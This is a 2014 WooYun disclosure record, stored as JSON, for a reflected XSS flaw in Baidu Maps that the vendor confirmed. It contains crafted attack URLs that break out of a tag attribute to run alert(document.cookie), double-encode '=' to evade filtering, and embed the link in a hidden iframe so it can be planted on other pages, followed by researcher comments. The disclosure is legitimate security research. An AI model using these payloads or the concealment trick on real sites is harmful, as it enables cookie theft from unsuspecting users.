{"id": 1100, "wybug_id": "wooyun-2014-072321", "wybug_title": "百度地图持久形XSS漏洞", "wybug_corp": "百度", "wybug_author": "q601333824", "wybug_date": "2014-08-14 08:49", "wybug_open_date": "2014-09-28 08:50", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "持久型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向公众公开  简要描述： <script>alert(/我是标题党/)</script> 详细说明：        1.百度地图存在反射形XSS漏洞，但是被利用，可以变成持久形      2.存在XSS的连接 \nhttp://map.baidu.com/?newmap=1&shareurl=2&l=12&tn=B_NORMAL_MAP&c=13382905,3515188&s=bd%26fstq%3D1%26from%3Dwebmap%26c%3D179%26pn%3D0%26rn%3D10%26wd%3D<!XSS!>%26sivtp%3D1%26l%3D12%26bdfrom%3D1\n     3.上面那段代码，从参数&fstq开始，之后的参数带符号的都需要编码，不进行编码，搜索是空的，比如解码之后访问,如图 \nhttp://map.baidu.com/?newmap=1&shareurl=2&l=12&tn=B_NORMAL_MAP&c=13382905,3515188&s=bd&fstq=1&from=webmap&c=179&pn=0&rn=10&wd=<!XSS!>&sivtp=1&l=12&bdfrom=1\n \n\n      4,如果测试的时候搜索是空的，大概是这个问题---------------------------------------------------------------------------------------     5,然后.存在XSS的参数是&wd参数，因为这个参数会把单引号，当成双引号，然后被当成属性分割出去了.而且XSS刚好存在<a>标签里面，如图 \n\n    6.知道这个，然后再构造代码。\n'onmousemove=\"alert(document.cookie)\"style=\"font-size:999px;cursor: default !important;\"\n    7.style属性把字体设置大点容易点到    8.然后要再把=等于号两次编码，因为这个参数测试的时候如果存在等于号的时候搜索内容清空，所以编码两次就不会清空了. \n= → %3d → %253d\n如图    构造好的代码\nhttp://map.baidu.com/?newmap=1&shareurl=2&l=12&tn=B_NORMAL_MAP&c=13382905,3515188&s=bd%26fstq%3D1%26from%3Dwebmap%26c%3D179%26pn%3D0%26rn%3D10%26wd%3D'onmousemove%253D%22alert(document.cookie)%22style%253d%22font-size:999px;cursor:%20default%20!important;%22%26sivtp%3D1%26l%3D12%26bdfrom%3D1\n   9.如图 \n\n  10.当把鼠标移动到左边的时候就触发XSS了------------------------------------------------------------------------------------------  11.这个时候百度会说，一般只有小白才会去点这个连接，而且鼠标还要移动上去，懂的人根本不会去点  12.这个时候可以用iframe框架，增加隐蔽   13.最终构造好的代码,下面 \n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><title>存储型XSS测试</title><style type=\"text/css\">body {\ttext-align:center}</style></head><body><iframe src=\"http://map.baidu.com/?newmap=1&shareurl=2&l=12&tn=B_NORMAL_MAP&c=13382905,3515188&s=bd%26fstq%3D1%26from%3Dwebmap%26c%3D179%26pn%3D0%26rn%3D10%26wd%3D'onmousemove%253D%22alert(document.cookie)%22style%253d%22font-size:999px;cursor:%20default%20!important;%22%26sivtp%3D1%26l%3D12%26bdfrom%3D1\" height=\"1000\" width=\"350\" style=\"position:absolute; left:500px; top:-500px;\" scrolling=\"no\"></body></html>\n  14.上面那段代码简单说，就是，iframe框架里面加上反射XSS连接，然后设置宽和高，刚好和XSS范围大小一样，然后为了隐藏上面搜索栏的那段代码，可以设置绝对位置为负数，往上面移动，挡住搜索栏，这样就不会被看见了    15.最终效果图.如图 \n\n   16.看上面的图可以看出，可以当持久形XSS了，可以被人挂在自己的网站   漏洞证明：   1.  \n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><title>存储型XSS测试</title><style type=\"text/css\">body {\ttext-align:center}</style></head><body><iframe src=\"http://map.baidu.com/?newmap=1&shareurl=2&l=12&tn=B_NORMAL_MAP&c=13382905,3515188&s=bd%26fstq%3D1%26from%3Dwebmap%26c%3D179%26pn%3D0%26rn%3D10%26wd%3D'onmousemove%253D%22alert(document.cookie)%22style%253d%22font-size:999px;cursor:%20default%20!important;%22%26sivtp%3D1%26l%3D12%26bdfrom%3D1\" height=\"1000\" width=\"350\" style=\"position:absolute; left:500px; top:-500px;\" scrolling=\"no\"></body></html>\n 2. \n\n   修复方案：  虽然不知道为什么单引号可以当成双引号，但是感觉好厉害的样子   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-08-14 13:35 厂商回复： 感谢对百度安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-14 09:13 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  前排看看    \n     2014-08-14 12:53 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  大牛，我收藏一下漏洞！    \n     2014-08-14 15:04 |    \t\t大风对我说 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 酱油党)\t\t \n  看看，很期待    \n     2014-08-14 23:13 |    \t\t233 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小孩子看了根本把持不住)\t\t \n  大牛，我收藏一下漏洞！     \n     2014-08-15 04:15 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  @233 TBCC    \n     2014-08-15 10:48 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  @浅兮 我是小白，输入框到处叉叉看就碰到了    \n     2014-08-15 12:31 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  @q601333824 别吹牛啦！我收藏了！管你    \n     2014-08-15 17:08 |    \t\t233 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小孩子看了根本把持不住)\t\t \n  @q601333824 别吹牛啦！我收藏了！管你     \n     2014-09-05 22:25 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  漏洞不错。不过按你这么说，用个iframe反射型都能变持久了..持久不是这个意思吧。。    \n     2014-09-05 22:50 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  @phith0n 因为提交之前，怕重复，先在乌云搜索过，以前有过类似,看别人说反射只有1-3rank,所以感觉利用方法也弄出来rank会高点...    \n     2014-10-04 00:50 |    \t\tMurk Emissary \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:14        | 低调做人 低调行事)\t\t \n  @q601333824 利用方法出来了，Rank 5+    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}